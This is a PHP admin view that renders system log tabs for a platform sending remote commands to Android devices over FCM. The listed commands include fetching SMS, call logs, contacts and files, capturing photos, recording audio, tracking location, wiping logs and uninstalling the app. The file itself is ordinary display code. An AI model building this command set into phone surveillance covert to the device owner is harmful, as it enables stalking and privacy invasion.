<?php
$actionLabels = [
    'login_password'      => ['label' => 'Password Login',     'icon' => 'fa-sign-in-alt', 'color' => 'success'],
    'login_token'         => ['label' => 'Token Login',         'icon' => 'fa-key',         'color' => 'primary'],
    'login_qr'            => ['label' => 'QR Login',            'icon' => 'fa-qrcode',      'color' => 'info'],
    'login_token_android' => ['label' => 'Android Token Login', 'icon' => 'fa-robot',       'color' => 'primary'],
    'token_verification'  => ['label' => 'Token Verification',  'icon' => 'fa-key',         'color' => 'secondary'],
    'file_upload'         => ['label' => 'File Upload',         'icon' => 'fa-upload',      'color' => 'info'],
    'device_registration' => ['label' => 'Device Registration', 'icon' => 'fa-mobile-alt',  'color' => 'warning'],
    'profile_update'      => ['label' => 'Profile Update',      'icon' => 'fa-user-edit',   'color' => 'primary'],
    'token_regenerate'    => ['label' => 'Token Regenerate',    'icon' => 'fa-sync',        'color' => 'warning'],
    'token_create'        => ['label' => 'Token Created',       'icon' => 'fa-plus-circle', 'color' => 'success'],
    'register'            => ['label' => 'Registration',        'icon' => 'fa-user-plus',   'color' => 'success'],
    'password_forgot'     => ['label' => 'Forgot Password',     'icon' => 'fa-question-circle','color' => 'warning'],
    'password_reset'      => ['label' => 'Password Reset',      'icon' => 'fa-key',         'color' => 'danger'],
    'password_reset_offline' => ['label' => 'Offline Password Reset','icon' => 'fa-key',  'color' => 'danger'],
    'logout'              => ['label' => 'Logout',              'icon' => 'fa-sign-out-alt','color' => 'secondary'],
    'maintenance_blocked' => ['label' => 'Maintenance Block',   'icon' => 'fa-shield-alt',  'color' => 'warning'],
];

function fmtAction(string $type): array {
    global $actionLabels;
    if (str_starts_with($type, 'remote_cmd_')) {
        $cmd = substr($type, 11);
        return ['label' => 'FCM: ' . ucfirst(str_replace('_', ' ', $cmd)), 'icon' => 'fa-fire', 'color' => 'info'];
    }
    if (str_starts_with($type, 'admin_')) {
        $cmd = substr($type, 6);
        return ['label' => 'Admin: ' . ucfirst(str_replace('_', ' ', $cmd)), 'icon' => 'fa-user-shield', 'color' => 'danger'];
    }
    $descriptive = [
        'fetch_sms' => ['label' => 'Fetch SMS', 'icon' => 'fa-fire', 'color' => 'info'],
        'fetch_calls' => ['label' => 'Fetch Calls', 'icon' => 'fa-fire', 'color' => 'info'],
        'fetch_contacts' => ['label' => 'Fetch Contacts', 'icon' => 'fa-fire', 'color' => 'info'],
        'capture_photo' => ['label' => 'Capture Photo', 'icon' => 'fa-fire', 'color' => 'info'],
        'record_audio' => ['label' => 'Record Audio', 'icon' => 'fa-fire', 'color' => 'info'],
        'play_beep' => ['label' => 'Play Beep', 'icon' => 'fa-fire', 'color' => 'info'],
        'play_siren' => ['label' => 'Play Siren', 'icon' => 'fa-fire', 'color' => 'info'],
        'reset_app' => ['label' => 'Reset App', 'icon' => 'fa-fire', 'color' => 'warning'],
        'deactivate_app' => ['label' => 'Deactivate App', 'icon' => 'fa-fire', 'color' => 'warning'],
        'logout_user' => ['label' => 'Logout User', 'icon' => 'fa-fire', 'color' => 'warning'],
        'update_settings' => ['label' => 'Update Settings', 'icon' => 'fa-fire', 'color' => 'info'],
        'open_permission' => ['label' => 'Open Permission', 'icon' => 'fa-fire', 'color' => 'info'],
        'uninstall_preserve' => ['label' => 'Uninstall (Keep)', 'icon' => 'fa-fire', 'color' => 'danger'],
        'uninstall_wipe' => ['label' => 'Uninstall (Wipe)', 'icon' => 'fa-fire', 'color' => 'danger'],
        'sync_all' => ['label' => 'Sync All', 'icon' => 'fa-fire', 'color' => 'info'],
        'sync_data' => ['label' => 'Sync Data', 'icon' => 'fa-fire', 'color' => 'info'],
        'locate_device' => ['label' => 'Locate Device', 'icon' => 'fa-fire', 'color' => 'info'],
        'wipe_logs' => ['label' => 'Wipe Logs', 'icon' => 'fa-fire', 'color' => 'warning'],
        'reactivate_app' => ['label' => 'Reactivate App', 'icon' => 'fa-fire', 'color' => 'info'],
        'search_data' => ['label' => 'Search Data', 'icon' => 'fa-fire', 'color' => 'info'],
        'start_tracking' => ['label' => 'Start Tracking', 'icon' => 'fa-fire', 'color' => 'info'],
        'fetch_file' => ['label' => 'Fetch File', 'icon' => 'fa-fire', 'color' => 'info'],
    ];
    if (isset($descriptive[$type])) {
        return $descriptive[$type];
    }
    if (str_starts_with($type, 'upload_')) {
        $cat = substr($type, 7);
        return ['label' => 'Upload: ' . ucfirst(str_replace('_', ' ', $cat)), 'icon' => 'fa-upload', 'color' => 'info'];
    }
    return $actionLabels[$type] ?? ['label' => ucfirst(str_replace('_', ' ', $type)), 'icon' => 'fa-circle', 'color' => 'secondary'];
}

$tab = $active_tab ?? 'all';
?>
<div class="content-wrapper">
    <section class="content-header">
        <div class="container-fluid">
            <div class="row mb-2">
                <div class="col-sm-6">
                    <h1><i class="fas fa-clipboard-list mr-1"></i> System Logs</h1>
                </div>
                <div class="col-sm-6">
                    <ol class="breadcrumb float-sm-right">
                        <li class="breadcrumb-item"><a href="<?= base_url('admin/dashboard') ?>">Admin</a></li>
                        <li class="breadcrumb-item active">Logs</li>
                    </ol>
                </div>
            </div>
        </div>
    </section>

    <section class="content">
        <div class="container-fluid">
            <?php if (session()->getFlashdata('message')): ?>
            <div class="alert alert-success alert-dismissible">
                <button type="button" class="close" data-dismiss="alert">&times;</button>
                <?= session()->getFlashdata('message') ?>
            </div>
            <?php endif; ?>
            <?php if (session()->getFlashdata('error')): ?>
            <div class="alert alert-danger alert-dismissible">
                <button type="button" class="close" data-dismiss="alert">&times;</button>
                <?= session()->getFlashdata('error') ?>
            </div>
            <?php endif; ?>

            <?php
            $callouts = [
                'all' => ['title' => 'All System Logs', 'desc' => 'Every system action recorded — user logins, admin operations, API requests, remote device commands, and system events. Filter by severity, category or outcome. Critical security events (such as role changes) are restricted to the superadmin audit trail.'],
                'access' => ['title' => 'Access Logs', 'desc' => 'Authentication and access events — user logins (password, token, QR), logout, token verification, and registration attempts. Audit trail for who accessed the platform and when.'],
                'errors' => ['title' => 'Error Logs', 'desc' => 'Failed operations and system errors — unsuccessful login attempts, failed API calls, upload errors, and any action that did not complete successfully.'],
                'php-errors' => ['title' => 'PHP Error Logs', 'desc' => 'PHP runtime error files — parse errors, exceptions, warnings, and notices logged by the application. View raw log file contents and clear old files to free up disk space.'],
                'api' => ['title' => 'API Logs', 'desc' => 'API endpoint activity — file uploads, system operations, and security-related requests. Monitor API usage patterns, response statuses, and client IP addresses.'],
                'fcm' => ['title' => 'Firebase Cloud Messaging Logs', 'desc' => 'Remote device commands sent via FCM — fetch SMS, locate device, capture photo, play siren, sync data, and other push commands dispatched to Android devices.'],
                'maintenance' => ['title' => 'Maintenance Block Logs', 'desc' => 'Requests blocked during maintenance mode — non-admin users and API clients that were denied access while the platform was in maintenance mode.'],
                'engine' => ['title' => 'Anomaly Engine Logs', 'desc' => 'ML anomaly detection job history — algorithm runs, engine type (PHP/Python), job status, progress, and per-algorithm execution details for the detection pipeline.'],
            ];
            $ct = $callouts[$tab] ?? $callouts['all'];
            ?>
            <div class="callout callout-info bg-light shadow-sm border-left-info mb-4">
                <div class="d-flex align-items-center">
                    <i class="fas fa-info-circle text-info fa-2x mr-3"></i>
                    <div>
                        <h5 class="text-info font-weight-bold mb-1"><?= $ct['title'] ?></h5>
                        <p class="mb-0 small text-muted"><?= $ct['desc'] ?></p>
                    </div>
                </div>
            </div>

            <div class="card">
                <div class="card-header">
                    <ul class="nav nav-tabs card-header-tabs" id="logTabs" role="tablist">
                        <li class="nav-item">
                            <a class="nav-link <?= $tab === 'all' ? 'active' : '' ?>" href="<?= base_url('admin/logs') ?>" role="tab"><i class="fas fa-list mr-1"></i>All <span class="badge badge-secondary ml-1"><?= number_format($count_all) ?></span></a>
                        </li>
                        <li class="nav-item">
                            <a class="nav-link <?= $tab === 'access' ? 'active' : '' ?>" href="<?= base_url('admin/logs/access') ?>" role="tab"><i class="fas fa-sign-in-alt mr-1"></i>Access <span class="badge badge-secondary ml-1"><?= number_format($count_access) ?></span></a>
                        </li>
                        <li class="nav-item">
                            <a class="nav-link <?= $tab === 'errors' ? 'active' : '' ?>" href="<?= base_url('admin/logs/errors') ?>" role="tab"><i class="fas fa-exclamation-triangle mr-1"></i>Errors <span class="badge badge-secondary ml-1"><?= number_format($count_errors) ?></span></a>
                        </li>
                        <li class="nav-item">
                            <a class="nav-link <?= $tab === 'php-errors' ? 'active' : '' ?>" href="<?= base_url('admin/logs/php-errors') ?>" role="tab"><i class="fas fa-file-alt mr-1"></i>PHP Errors <span class="badge badge-secondary ml-1"><?= number_format($count_php_errors) ?></span></a>
                        </li>
                        <li class="nav-item">
                            <a class="nav-link <?= $tab === 'api' ? 'active' : '' ?>" href="<?= base_url('admin/logs/api') ?>" role="tab"><i class="fas fa-code mr-1"></i>API <span class="badge badge-secondary ml-1"><?= number_format($count_api) ?></span></a>
                        </li>
                        <li class="nav-item">
                            <a class="nav-link <?= $tab === 'fcm' ? 'active' : '' ?>" href="<?= base_url('admin/logs/fcm') ?>" role="tab"><i class="fas fa-fire mr-1"></i>FCM <span class="badge badge-secondary ml-1"><?= number_format($count_fcm) ?></span></a>
                        </li>
                        <li class="nav-item">
                            <a class="nav-link <?= $tab === 'maintenance' ? 'active' : '' ?>" href="<?= base_url('admin/logs/maintenance') ?>" role="tab"><i class="fas fa-shield-alt mr-1"></i>Maintenance <span class="badge badge-secondary ml-1"><?= number_format($count_maintenance) ?></span></a>
                        </li>
                        <li class="nav-item">
                            <a class="nav-link <?= $tab === 'engine' ? 'active' : '' ?>" href="<?= base_url('admin/logs/engine') ?>" role="tab"><i class="fas fa-robot mr-1"></i>Engine <span class="badge badge-secondary ml-1"><?= number_format($count_engine) ?></span></a>
                        </li>
                    </ul>
                </div>

                <div class="card-body p-0 tab-content">
                    <!-- ===== ALL LOGS ===== -->
                    <div class="tab-pane <?= $tab === 'all' ? 'active' : '' ?>" id="tab-all">
                        <div class="card-body py-2 border-bottom bg-light">
                            <form method="get" action="<?= base_url('admin/logs') ?>" class="form-inline">
                                <select name="severity" class="form-control form-control-sm mr-2 mb-1">
                                    <option value="">All severities</option>
                                    <?php foreach (['low', 'medium', 'high'] as $s): ?>
                                    <option value="<?= $s ?>" <?= ($filters['severity'] ?? null) === $s ? 'selected' : '' ?>><?= ucfirst($s) ?></option>
                                    <?php endforeach; ?>
                                </select>
                                <select name="category" class="form-control form-control-sm mr-2 mb-1">
                                    <option value="">All categories</option>
                                    <?php foreach ($categories as $c): ?>
                                    <option value="<?= htmlspecialchars($c) ?>" <?= ($filters['category'] ?? null) === $c ? 'selected' : '' ?>><?= htmlspecialchars(ucfirst($c)) ?></option>
                                    <?php endforeach; ?>
                                </select>
                                <select name="outcome" class="form-control form-control-sm mr-2 mb-1">
                                    <option value="">All outcomes</option>
                                    <option value="success" <?= ($filters['outcome'] ?? null) === 'success' ? 'selected' : '' ?>>Success</option>
                                    <option value="failed" <?= ($filters['outcome'] ?? null) === 'failed' ? 'selected' : '' ?>>Failed</option>
                                </select>
                                <button type="submit" class="btn btn-sm btn-primary mb-1"><i class="fas fa-filter"></i> Apply</button>
                                <a href="<?= base_url('admin/logs') ?>" class="btn btn-sm btn-outline-secondary ml-1 mb-1">Reset</a>
                            </form>
                        </div>
                        <table class="table table-hover" id="logsTableAll">
                            <thead><tr><th>Timestamp</th><th>User</th><th>Action</th><th>Category</th><th>Severity</th><th>IP</th><th>Status</th><th>Details</th></tr></thead>
                            <tbody>
                                <?php if (empty($logs)): ?>
                                <tr><td colspan="8" class="text-center text-muted py-4">No logs found.</td></tr>
                                <?php else: ?>
                                <?php foreach ($logs as $log): ?>
                                <?php $ai = fmtAction($log['action_type'] ?? '');
                                      $nv = !empty($log['new_values']) ? json_decode($log['new_values'], true) : [];
                                      $isFcm = str_starts_with($log['action_type'] ?? '', 'remote_cmd_');
                                ?>
                                <tr>
                                    <td class="text-nowrap"><small><?= htmlspecialchars($log['date'] ?? '-') ?></small></td>
                                    <td><i class="fas fa-user-circle text-muted mr-1"></i><?= htmlspecialchars($log['username'] ?? 'System') ?></td>
                                    <td><span class="badge badge-<?= $ai['color'] ?>"><i class="fas <?= $ai['icon'] ?> mr-1"></i><?= $ai['label'] ?></span></td>
                                    <td><span class="badge badge-secondary"><?= htmlspecialchars($log['category'] ?? '-') ?></span></td>
                                    <td><span class="badge badge-<?= ($log['severity'] ?? 'low') === 'critical' ? 'danger' : (($log['severity'] ?? 'low') === 'high' ? 'warning' : (($log['severity'] ?? 'low') === 'medium' ? 'info' : 'secondary')) ?>"><?= htmlspecialchars($log['severity'] ?? 'low') ?></span></td>
                                    <td><code><?= htmlspecialchars($log['ip_address'] ?? '-') ?></code></td>
                                    <td><?php if ($log['success']): ?><span class="badge badge-success"><i class="fas fa-check mr-1"></i> Success</span><?php else: ?><span class="badge badge-danger"><i class="fas fa-times mr-1"></i> Failed</span><?php endif; ?></td>
                                    <td><?php if ($isFcm && !empty($nv['command'])): ?><small class="text-muted"><i class="fas fa-terminal mr-1"></i><?= htmlspecialchars(str_replace('cmd_', '', $nv['command'])) ?><?php if (!empty($nv['payload']) && $nv['payload'] !== 'all'): ?>/ <code><?= htmlspecialchars($nv['payload']) ?></code><?php endif; ?></small><?php elseif (!empty($log['error_message'])): ?><small class="text-danger" title="<?= htmlspecialchars($log['error_message']) ?>"><i class="fas fa-exclamation-circle mr-1"></i><?= htmlspecialchars(mb_substr($log['error_message'], 0, 40)) ?></small><?php else: ?><span class="text-muted small">—</span><?php endif; ?></td>
                                </tr>
                                <?php endforeach; ?>
                                <?php endif; ?>
                            </tbody>
                        </table>
                        <?php if ($total_all > $per_page): ?>
                        <div class="card-footer">
                            <div class="row">
                                <div class="col-md-6">
                                    <div class="entry-info">
                                        Showing <?= (($current_page - 1) * $per_page) + 1 ?>
                                        to <?= min($current_page * $per_page, $total_all) ?>
                                        of <?= number_format($total_all) ?> entries
                                    </div>
                                </div>
                                <div class="col-md-6">
                                    <div class="float-right">
                                        <?= $pager->links('default', 'bootstrap5_full') ?>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <?php endif; ?>
                    </div>

                    <!-- ===== ACCESS LOGS ===== -->
                    <div class="tab-pane <?= $tab === 'access' ? 'active' : '' ?>" id="tab-access">
                        <table class="table table-hover" id="logsTableAccess">
                            <thead><tr><th>Timestamp</th><th>User</th><th>Action</th><th>IP</th><th>Status</th></tr></thead>
                            <tbody>
                                <?php if (empty($accessLogs)): ?>
                                <tr><td colspan="5" class="text-center text-muted py-4">No access logs found.</td></tr>
                                <?php else: ?>
                                <?php foreach ($accessLogs as $log): ?>
                                <?php $ai = fmtAction($log['action_type'] ?? ''); ?>
                                <tr>
                                    <td class="text-nowrap"><small><?= htmlspecialchars($log['date'] ?? '-') ?></small></td>
                                    <td><i class="fas fa-user-circle text-muted mr-1"></i><?= htmlspecialchars($log['username'] ?? 'System') ?></td>
                                    <td><span class="badge badge-<?= $ai['color'] ?>"><i class="fas <?= $ai['icon'] ?> mr-1"></i><?= $ai['label'] ?></span></td>
                                    <td><code><?= htmlspecialchars($log['ip_address'] ?? '-') ?></code></td>
                                    <td><?php if (isset($log['success']) && $log['success']): ?><span class="badge badge-success">Success</span><?php else: ?><span class="badge badge-danger">Failed</span><?php endif; ?></td>
                                </tr>
                                <?php endforeach; ?>
                                <?php endif; ?>
                            </tbody>
                        </table>
                    </div>

                    <!-- ===== ERROR LOGS ===== -->
                    <div class="tab-pane <?= $tab === 'errors' ? 'active' : '' ?>" id="tab-errors">
                        <table class="table table-hover" id="logsTableErrors">
                            <thead><tr><th>Timestamp</th><th>User</th><th>Action</th><th>Error</th><th>IP</th></tr></thead>
                            <tbody>
                                <?php if (empty($errorLogs)): ?>
                                <tr><td colspan="5" class="text-center text-muted py-4">No error logs found.</td></tr>
                                <?php else: ?>
                                <?php foreach ($errorLogs as $log): ?>
                                <?php $ai = fmtAction($log['action_type'] ?? ''); ?>
                                <tr>
                                    <td class="text-nowrap"><small><?= htmlspecialchars($log['created_at'] ?? '-') ?></small></td>
                                    <td><i class="fas fa-user-circle text-muted mr-1"></i><?= htmlspecialchars($log['username'] ?? 'System') ?></td>
                                    <td><span class="badge badge-<?= $ai['color'] ?>"><?= $ai['label'] ?></span></td>
                                    <td><small class="text-danger"><?= htmlspecialchars(mb_substr($log['error_message'] ?? 'Unknown error', 0, 60)) ?></small></td>
                                    <td><code><?= htmlspecialchars($log['ip_address'] ?? '-') ?></code></td>
                                </tr>
                                <?php endforeach; ?>
                                <?php endif; ?>
                            </tbody>
                        </table>
                    </div>

                    <!-- ===== PHP ERROR LOGS ===== -->
                    <div class="tab-pane <?= $tab === 'php-errors' ? 'active' : '' ?>" id="tab-php-errors">
                        <?php if (!empty($errorFilename) && !empty($errorLines)): ?>
                        <div class="mb-2">
                            <a href="<?= base_url('admin/logs') ?>" class="btn btn-sm btn-outline-secondary"><i class="fas fa-arrow-left mr-1"></i> Back to PHP Error Files</a>
                            <small class="text-muted ml-2">Viewing: <code><?= htmlspecialchars($errorFilename) ?></code> (last <?= count($errorLines) ?> lines)</small>
                        </div>
                        <pre class="p-3 bg-dark text-light rounded" style="max-height:600px;overflow:auto;font-size:12px;line-height:1.4;"><?php foreach ($errorLines as $line): ?><?= htmlspecialchars($line) ?><?php echo "\n"; ?><?php endforeach; ?></pre>
                        <?php else: ?>
                        <table class="table table-hover" id="logsTablePhpErrors">
                            <thead><tr><th>Filename</th><th>Size</th><th>Lines</th><th>Modified</th><th></th></tr></thead>
                            <tbody>
                                <?php if (empty($phpErrorFiles)): ?>
                                <tr><td colspan="5" class="text-center text-muted py-4">No PHP error log files found.</td></tr>
                                <?php else: ?>
                                <?php foreach ($phpErrorFiles as $f): ?>
                                <tr>
                                    <td><code><?= htmlspecialchars($f['filename']) ?></code></td>
                                    <td><?= number_format($f['size']) ?> B</td>
                                    <td><?= number_format($f['lines']) ?></td>
                                    <td><small><?= htmlspecialchars($f['modified']) ?></small></td>
                                    <td><a href="<?= base_url('admin/logs/view-error-file/' . $f['filename']) ?>" class="btn btn-sm btn-outline-primary"><i class="fas fa-eye"></i></a></td>
                                </tr>
                                <?php endforeach; ?>
                                <?php endif; ?>
                            </tbody>
                        </table>
                        <?php endif; ?>
                    </div>

                    <!-- ===== API LOGS ===== -->
                    <div class="tab-pane <?= $tab === 'api' ? 'active' : '' ?>" id="tab-api">
                        <table class="table table-hover" id="logsTableApi">
                            <thead><tr><th>Timestamp</th><th>User</th><th>Action</th><th>Category</th><th>Status</th><th>IP</th></tr></thead>
                            <tbody>
                                <?php if (empty($apiLogs)): ?>
                                <tr><td colspan="6" class="text-center text-muted py-4">No API logs found.</td></tr>
                                <?php else: ?>
                                <?php foreach ($apiLogs as $log): ?>
                                <?php $ai = fmtAction($log['action_type'] ?? ''); ?>
                                <tr>
                                    <td class="text-nowrap"><small><?= htmlspecialchars($log['created_at'] ?? '-') ?></small></td>
                                    <td><i class="fas fa-user-circle text-muted mr-1"></i><?= htmlspecialchars($log['username'] ?? 'System') ?></td>
                                    <td><span class="badge badge-<?= $ai['color'] ?>"><?= $ai['label'] ?></span></td>
                                    <td><span class="badge badge-secondary"><?= htmlspecialchars($log['action_category'] ?? '-') ?></span></td>
                                    <td><?php if ($log['success']): ?><span class="badge badge-success"><i class="fas fa-check mr-1"></i></span><?php else: ?><span class="badge badge-danger"><i class="fas fa-times mr-1"></i></span><?php endif; ?></td>
                                    <td><code><?= htmlspecialchars($log['ip_address'] ?? '-') ?></code></td>
                                </tr>
                                <?php endforeach; ?>
                                <?php endif; ?>
                            </tbody>
                        </table>
                    </div>

                    <!-- ===== FCM LOGS ===== -->
                    <div class="tab-pane <?= $tab === 'fcm' ? 'active' : '' ?>" id="tab-fcm">
                        <table class="table table-hover" id="logsTableFcm">
                            <thead><tr><th>Timestamp</th><th>User</th><th>Command</th><th>Details</th><th>Status</th></tr></thead>
                            <tbody>
                                <?php if (empty($fcmLogs)): ?>
                                <tr><td colspan="5" class="text-center text-muted py-4">No FCM logs found.</td></tr>
                                <?php else: ?>
                                <?php foreach ($fcmLogs as $log): ?>
                                <?php $nv = !empty($log['new_values']) ? json_decode($log['new_values'], true) : []; ?>
                                <tr>
                                    <td class="text-nowrap"><small><?= htmlspecialchars($log['created_at'] ?? '-') ?></small></td>
                                    <td><i class="fas fa-user-circle text-muted mr-1"></i><?= htmlspecialchars($log['username'] ?? 'System') ?></td>
                                    <td><span class="badge badge-info"><i class="fas fa-fire mr-1"></i><?= htmlspecialchars(ucfirst(str_replace('remote_cmd_', '', $log['action_type'] ?? ''))) ?></span></td>
                                    <td><?php if (!empty($nv['payload'])): ?><small class="text-muted">Payload: <code><?= htmlspecialchars($nv['payload']) ?></code></small><?php else: ?><span class="text-muted small">—</span><?php endif; ?></td>
                                    <td><?php if ($log['success']): ?><span class="badge badge-success">Sent</span><?php else: ?><span class="badge badge-danger">Failed</span><?php endif; ?></td>
                                </tr>
                                <?php endforeach; ?>
                                <?php endif; ?>
                            </tbody>
                        </table>
                    </div>

                    <!-- ===== MAINTENANCE LOGS ===== -->
                    <div class="tab-pane <?= $tab === 'maintenance' ? 'active' : '' ?>" id="tab-maintenance">
                        <table class="table table-hover" id="logsTableMaintenance">
                            <thead><tr><th>Timestamp</th><th>User</th><th>Action</th><th>IP</th></tr></thead>
                            <tbody>
                                <?php if (empty($maintenanceLogs)): ?>
                                <tr><td colspan="4" class="text-center text-muted py-4">No maintenance logs found.</td></tr>
                                <?php else: ?>
                                <?php foreach ($maintenanceLogs as $log): ?>
                                <tr>
                                    <td class="text-nowrap"><small><?= htmlspecialchars($log['created_at'] ?? '-') ?></small></td>
                                    <td><i class="fas fa-user-circle text-muted mr-1"></i><?= htmlspecialchars($log['username'] ?? 'System') ?></td>
                                    <td><span class="badge badge-warning"><i class="fas fa-shield-alt mr-1"></i>Blocked</span></td>
                                    <td><code><?= htmlspecialchars($log['ip_address'] ?? '-') ?></code></td>
                                </tr>
                                <?php endforeach; ?>
                                <?php endif; ?>
                            </tbody>
                        </table>
                    </div>

                    <!-- ===== ENGINE LOGS ===== -->
                    <div class="tab-pane <?= $tab === 'engine' ? 'active' : '' ?>" id="tab-engine">
                        <table class="table table-hover" id="logsTableEngine">
                            <thead><tr><th>Job ID</th><th>User</th><th>Engine</th><th>Status</th><th>Progress</th><th>Started</th><th>Completed</th><th>Algorithms</th><th></th></tr></thead>
                            <tbody>
                                <?php if (empty($engineHistory)): ?>
                                <tr><td colspan="9" class="text-center text-muted py-4">No engine jobs found.</td></tr>
                                <?php else: ?>
                                <?php foreach ($engineHistory as $job): ?>
                                <tr>
                                    <td><code>#<?= $job['id'] ?></code></td>
                                    <td><i class="fas fa-user-circle text-muted mr-1"></i><?= htmlspecialchars($job['username'] ?? 'User #' . $job['user_id']) ?></td>
                                    <td><span class="badge badge-<?= ($job['engine'] ?? 'php') === 'python' ? 'warning' : 'primary' ?>"><?= htmlspecialchars($job['engine'] ?? 'php') ?></span></td>
                                    <td><span class="badge badge-<?= ($job['status'] ?? '') === 'completed' ? 'success' : (($job['status'] ?? '') === 'failed' ? 'danger' : 'secondary') ?>"><?= htmlspecialchars($job['status'] ?? 'unknown') ?></span></td>
                                    <td><?= ($job['progress_pct'] ?? 0) ?>%</td>
                                    <td><small><?= htmlspecialchars($job['started_at'] ?? $job['created_at'] ?? '-') ?></small></td>
                                    <td><small><?= htmlspecialchars($job['completed_at'] ?? '-') ?></small></td>
                                    <td><small><?= htmlspecialchars($job['algorithms'] ?? '-') ?></small></td>
                                    <td><button class="btn btn-xs btn-outline-info" onclick="showAlgoDetails(<?= $job['id'] ?>)"><i class="fas fa-list"></i></button></td>
                                </tr>
                                <?php endforeach; ?>
                                <?php endif; ?>
                            </tbody>
                        </table>
                    </div>
                </div>
            </div>
        </div>
    </section>
</div>

<div class="modal fade" id="algoModal" tabindex="-1">
    <div class="modal-dialog modal-lg">
        <div class="modal-content">
            <div class="modal-header bg-gradient-info">
                <h5 class="modal-title"><i class="fas fa-microchip mr-2"></i>Algorithm Execution Details</h5>
                <button type="button" class="close text-white" data-dismiss="modal">&times;</button>
            </div>
            <div class="modal-body p-0" id="algoModalBody">
                <div class="text-center p-5"><i class="fas fa-spinner fa-spin fa-2x text-info"></i><p class="mt-2 text-muted">Loading algorithm data...</p></div>
            </div>
            <div class="modal-footer">
                <button type="button" class="btn btn-secondary btn-sm" data-dismiss="modal"><i class="fas fa-times mr-1"></i>Close</button>
            </div>
        </div>
    </div>
</div>

<script>
<?php if ($tab === 'engine'): ?>
const algoIcons = {
    sms:   { icon: 'fa-sms',         color: '#dc3545', label: 'SMS' },
    calls: { icon: 'fa-phone',       color: '#ffc107', label: 'Call' },
    loc:   { icon: 'fa-map-marker-alt', color: '#007bff', label: 'Location' },
    contacts: { icon: 'fa-address-book', color: '#28a745', label: 'Contact' },
};
function algoMeta(id) {
    if (!id) return { icon: 'fa-microchip', color: '#6c757d', label: 'Algorithm' };
    const prefix = id.split('_')[0];
    const m = algoIcons[prefix];
    return m || { icon: 'fa-microchip', color: '#6c757d', label: prefix };
}
<?php endif; ?>

$(document).ready(function() {
    $('.tab-pane.active table').each(function() {
        if (!$.fn.dataTable.isDataTable(this)) {
            $(this).DataTable({ order: [[0, 'desc']], searching: false, paging: false, responsive: true });
        }
    });
});

function showAlgoDetails(jobId) {
    $('#algoModal').modal('show');
    $('#algoModalBody').html(
        '<div class="text-center p-5"><i class="fas fa-spinner fa-spin fa-2x text-info"></i><p class="mt-2 text-muted">Loading algorithm data...</p></div>'
    );
    $.get('<?= base_url('admin/logs/engine/algo-details') ?>/' + jobId, function(data) {
        var html = '';
        if (data && data.length) {
            data.forEach(function(a) {
                var meta = algoMeta(a.id || a.algorithm_id || a.algorithm_name || '');
                var statusBadge = a.status === 'completed' ? 'badge-success' : (a.status === 'running' ? 'badge-warning' : (a.status === 'failed' ? 'badge-danger' : 'badge-secondary'));
                var statusIcon = a.status === 'completed' ? 'fa-check-circle' : (a.status === 'running' ? 'fa-spinner fa-spin' : (a.status === 'failed' ? 'fa-times-circle' : 'fa-question-circle'));
                var engineIcon = (a.engine || '').toLowerCase() === 'python' ? 'fa-python' : 'fa-php';
                var engineBadge = (a.engine || '').toLowerCase() === 'python' ? 'badge-warning' : 'badge-primary';
                var duration = a.duration_ms ? (a.duration_ms >= 1000 ? (a.duration_ms / 1000).toFixed(1) + 's' : a.duration_ms + 'ms') : '—';
                var findingsCount = (a.findings && a.findings.length) ? a.findings.length : 0;
                var hasFindings = findingsCount > 0;

                html += '<div class="card card-outline card-' + (a.status === 'completed' ? 'success' : (a.status === 'running' ? 'warning' : (a.status === 'failed' ? 'danger' : 'secondary'))) + ' m-2 shadow-sm">' +
                    '<div class="card-header py-2 d-flex justify-content-between align-items-center">' +
                        '<div><i class="fas ' + meta.icon + ' mr-2" style="color:' + meta.color + '"></i><strong>' + (a.name || a.algorithm_name || a.algorithm_id || 'Unknown') + '</strong></div>' +
                        '<div>' +
                            '<span class="badge ' + engineBadge + ' mr-1"><i class="fab ' + engineIcon + ' mr-1"></i>' + (a.engine || 'php').toUpperCase() + '</span>' +
                            '<span class="badge ' + statusBadge + '"><i class="fas ' + statusIcon + ' mr-1"></i>' + (a.status || 'unknown') + '</span>' +
                        '</div>' +
                    '</div>' +
                    '<div class="card-body py-2">' +
                        '<div class="row">' +
                            '<div class="col-4"><small class="text-muted"><i class="fas fa-hourglass-half mr-1"></i>Duration</small><br><strong>' + duration + '</strong></div>' +
                            '<div class="col-4"><small class="text-muted"><i class="fas fa-search mr-1"></i>Findings</small><br><strong>' + (hasFindings ? '<span class="text-danger"><i class="fas fa-exclamation-triangle mr-1"></i>' + findingsCount + '</span>' : '<span class="text-success"><i class="fas fa-check mr-1"></i>None</span>') + '</strong></div>' +
                            '<div class="col-4"><small class="text-muted"><i class="fas fa-microchip mr-1"></i>Category</small><br><strong>' + meta.label + '</strong></div>' +
                        '</div>' +
                    '</div>';
                if (hasFindings) {
                    html += '<div class="card-footer py-1 bg-light">' +
                        '<small class="text-muted"><i class="fas fa-flag mr-1"></i>Flagged ' + findingsCount + ' anomalous item(s) in this run</small>' +
                    '</div>';
                }
                html += '</div>';
            });
        } else {
            html = '<div class="text-center p-5 text-muted"><i class="fas fa-database fa-3x mb-3"></i><p>No algorithm data recorded for this job.</p></div>';
        }
        $('#algoModalBody').html(html);
    });
}
</script>
